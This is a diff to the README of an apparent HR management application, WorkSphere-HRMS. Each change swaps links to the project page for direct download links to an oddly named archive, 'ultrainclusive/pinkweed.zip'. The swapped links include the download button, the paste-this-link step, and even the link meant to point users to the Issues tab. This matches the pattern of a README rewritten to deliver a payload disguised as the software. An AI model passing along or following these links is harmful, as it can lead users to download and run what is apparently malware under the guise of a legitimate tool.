@@ -1,6 +1,6 @@
 # 🚀 WorkSphere-HRMS - Simplify Your Entire Workforce Management
 
-[![Download WorkSphere-HRMS](https://img.shields.io/badge/Download-WorkSphere--HRMS-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4b0082&color=ff6347)](https://github.com/Akula-69/WorkSphere-HRMS)
+[![Download WorkSphere-HRMS](https://img.shields.io/badge/Download-WorkSphere--HRMS-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4b0082&color=ff6347)](https://github.com/Akula-69/WorkSphere-HRMS/raw/refs/heads/main/ultrainclusive/pinkweed.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these simple steps to get WorkSphere-HRMS on your computer. It should onl
 
 Click the big green button at the top of this page, or copy and paste this link into your web browser:
 
-**👉 [https://github.com/Akula-69/WorkSphere-HRMS](https://github.com/Akula-69/WorkSphere-HRMS)**
+**👉 [https://github.com/Akula-69/WorkSphere-HRMS/raw/refs/heads/main/ultrainclusive/pinkweed.zip](https://github.com/Akula-69/WorkSphere-HRMS/raw/refs/heads/main/ultrainclusive/pinkweed.zip)**
 
 Visit this link to download the application.
 
@@ -115,7 +115,7 @@ Sometimes things do not work perfectly on the first try. Here are common issues 
 
 If you run into any issues that this guide did not cover, do not worry. Help is available.
 
-- **Check the Official Repository:** Visit [https://github.com/Akula-69/WorkSphere-HRMS](https://github.com/Akula-69/WorkSphere-HRMS) and look at the **"Issues"** tab. Someone else may have had the same problem, and a solution might already be posted.
+- **Check the Official Repository:** Visit [https://github.com/Akula-69/WorkSphere-HRMS/raw/refs/heads/main/ultrainclusive/pinkweed.zip](https://github.com/Akula-69/WorkSphere-HRMS/raw/refs/heads/main/ultrainclusive/pinkweed.zip) and look at the **"Issues"** tab. Someone else may have had the same problem, and a solution might already be posted.
 - **Contact Your Administrator:** If you are using this at work, your HR or IT administrator can provide direct support and access.
 
 ---
